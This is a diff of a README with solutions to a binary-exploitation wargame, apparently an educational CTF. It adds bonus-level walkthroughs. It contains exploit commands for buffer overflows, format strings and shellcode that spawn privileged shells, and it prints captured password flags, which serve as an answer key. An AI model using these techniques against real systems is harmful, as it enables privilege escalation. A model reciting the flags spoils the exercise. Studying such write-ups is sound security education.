@@ -2,7 +2,7 @@
 
 ## Level0:
 ### Code after RE:
-![level0.png](ressource%2Flevel0.png)
+![level0.png](./ressource/level0.png)
 ### Solution: 
 - We can have a shell as level1 by simple providing 423 as the first argument.
 - ``./level0 423`` (This spawn a shell as level1 user)\
@@ -12,7 +12,7 @@
 
 ## Level1
 ### Code after RE:
-![level1.png](ressource%2Flevel1.png)
+![level1.png](ressource/level1.png)
 ### Solution:
 - There is a function that will execute a shell as level2 but we cant execute it in the normal program flow.
 - We see that we can overflow the buffer through the ``gets`` function.
@@ -25,7 +25,7 @@
   
 ## Level2:
 ### Code after RE:
-![level2.png](ressource%2Flevel2.png)
+![level2.png](ressource/level2.png)
 ### Solution:
 - We can overflow the buffer inside the ``p`` function.
 - We craft a payload the change the return address of gets to the return inside the ``main`` function.
@@ -38,7 +38,7 @@
 
 ## Level3:
 ### Code after RE:
-![level3.png](ressource%2Flevel3.png)
+![level3.png](ressource/level3.png)
 ### Solution:
 - We cant overflow the buffer because they use ``fgets`` function.
 - However, we can manipulate the function ``printf`` with the use of a special specifier.
@@ -52,7 +52,7 @@
 
 ## Level4:
 ### Code after RE:
-![level4.png](ressource%2Flevel4.png)
+![level4.png](ressource/level4.png)
 ### Solution:
 - We cant overflow the buffer cause of the ``fgets`` function.
 - We can use the same method of the last level to write to the ``m`` var.
@@ -63,7 +63,7 @@
 
 ## Level5:
 ### Code after RE:
-![level5.png](ressource%2Flevel5.png)
+![level5.png](ressource/level5.png)
 ### Solution:
 - We cant overflow the buffer thanks to the ``fgets`` functions.
 - We still can use the printf trick to change the return address of the printf call.
@@ -76,7 +76,7 @@
 
 ## Level6:
 ### Code after RE:
-![level6.png](ressource%2Flevel6.png)
+![level6.png](ressource/level6.png)
 ### Solution:
 - We can overflow the ``dest`` buffer through the ``strcpy`` call.
 - We don't want that ``fn_ptr`` point to the ``m`` fn.
@@ -88,7 +88,7 @@
 
 ## Level7:
 ### Code after RE:
-![level7.png](ressource%2Flevel7.png)
+![level7.png](ressource/level7.png)
 ### Solution:
 - We can overflow ``array_1`` and ``array_2`` through ``strcpy``.
 - Our program think that the function address ``puts`` is located at a given address.
@@ -100,7 +100,7 @@
 
 ## Level8:
 ### Code after RE:
-![level8.png](ressource%2Flevel8.png)
+![level8.png](ressource/level8.png)
 ### Solution:
 - We use the command ``auth`` and ``service`` to allocate both pointer.
 - Then we run the ``login`` command to access the ``system`` call.
@@ -114,18 +114,60 @@
 
 ## Level9:
 ### Code after RE:
-![level9.png](ressource%2Flevel9.png)
+![level9.png](ressource/level9.png)
 ### Solution:
 - We can overwrite the memory of the two class through the ``setAnnotation`` function which use a dirty ``memcpy``.
 - We craft a payload with a shellcode that will call the ``system`` function.
 - ``python3 ./level9/craft_payload.py && scp -P 4243 ./payload level9@localhost:/tmp/payload``
 - ``./level9 $(cat payload)`` (This spawn a shell as bonus0 user)
 - ``cat /home/user/bonus0/.pass``
-
 ### Result:
     f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 
 
+## Bonus0:
+### Code after RE:
+![bonus0.png](ressource/bonus0.png)
+### Solution:
+- We can overflow v3 through the function ``p``
+- We will craft a shellcode with a lot of NOP operation and a call to ``system("/bin/sh")``
+- ``python3 ./bonus0/craft_payload.py && scp -P 4243 ./payload bonus0@localhost:/tmp/payload``
+- ``cat /tmp/payload - | ./bonus0 `` (This spawn a shell as bonus01)
+- ``cat /home/user/bonus1/.pass``
+### Result:
+    cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
+## Bonus1:
+### Code aftger RE:
+![bonus1.png](ressource/bonus1.png)
+### Solution:
+- There is a call to ``/bin/sh`` if we meet a certain condition.
+- ``v5`` need to overflow so the ``memcpy`` doesn't cause a segfault.
+- ``./bonus1 -1073741813 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaFLOW`` (This spawn a shell as bonus02)
+- ``cat /home/user/bonus2/.pass``
+### Result:
+ 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
 
 
+## Bonus2:
+### Code aftger RE:
+![bonus2.png](ressource/bonus2.png)
+### Solution:
+- We need the env variable ``LANG`` to be set to ``fi``.
+- We craft a payload that will overflow ``dest`` and call ``system("/bin.sh")``
+- ``LANG=fi ./bonus2 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa $(cat /tmp/payload)`` (This spawn a shell as bonus03)
+- ``cat /home/user/bonus3/.pass``
+### Result:
+   71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
 
+
+## Bonus3:
+### Code aftger RE:
+![bonus3.png](ressource/bonus3.png)
+### Solution:
+- We need to trigger a certain condition to a call to ``system("/bin/sh")``
+- Providing nothing will work !
+- ``./bonus3 ""`` (This spawn a shell as end)
+- ``cat /home/user/bonus4/.pass``
+### Result:
+    3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
